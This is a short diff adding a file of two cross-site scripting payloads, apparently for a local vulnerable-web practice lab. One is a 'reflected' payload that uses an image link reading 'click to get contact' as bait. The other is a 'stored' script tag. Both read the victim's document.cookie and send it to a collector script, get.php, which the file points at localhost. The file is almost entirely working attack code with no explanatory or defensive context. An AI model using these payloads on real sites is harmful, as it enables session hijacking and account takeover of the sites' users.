@@ -1,0 +1,15 @@
+Reflected XSS
+<a href="#" onclick="sendCookie()"> 
+<img src="../../images/gai.jpg" witdh="150px" height="150px"> <br>Click để lấy contact</a> 
+<script> 
+function sendCookie() {   
+var cookieValue = document.cookie;   	
+var encodedCookieValue = encodeURIComponent(cookieValue);   
+var url = "http://localhost/Webs-vul/getCookie/get.php?cookie=" + encodedCookieValue;   window.location.href = url; } 
+</script>
+
+
+Stored XSS
+<script> alert("hacked");var img = new Image(); img.src = "http://localhost/Webs-vul/getCookie/get.php?cookie=" + document.cookie; </script>
+
+
